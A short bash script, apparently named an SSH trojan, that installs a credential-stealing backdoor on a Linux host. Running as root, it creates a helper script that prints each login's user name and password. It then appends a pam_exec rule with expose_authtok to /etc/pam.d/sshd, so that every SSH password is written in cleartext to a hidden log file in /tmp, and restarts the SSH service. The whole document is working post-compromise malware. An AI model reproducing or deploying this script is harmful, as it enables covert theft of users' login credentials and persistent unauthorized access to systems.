#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"

#Check root permissions
if [[ $EUID -ne 0 ]]; then
  echo "You need root privileges to run this program"
  exit 1
fi

#Check log file exists or not
if [[ -e $file_log ]]; then
  echo "File $file_log was created in directory"
else
  touch $file_log
fi

path_script="/usr/local/bin/sshloggerscript.sh"

cat << EOF >$path_script
#!/bin/bash
read password
echo "User: \$PAM_USER"
echo "Password: \$password"
exit \$?
EOF

chmod +x $path_script
echo "Creat file $path_script to run script"

file_pamsshd="/etc/pam.d/sshd"
cat << EOF >> $file_pamsshd
@include common-auth
#use module pam_exec to call an external command
auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $path_script
EOF

#ssh restarting
/etc/init.d/ssh restart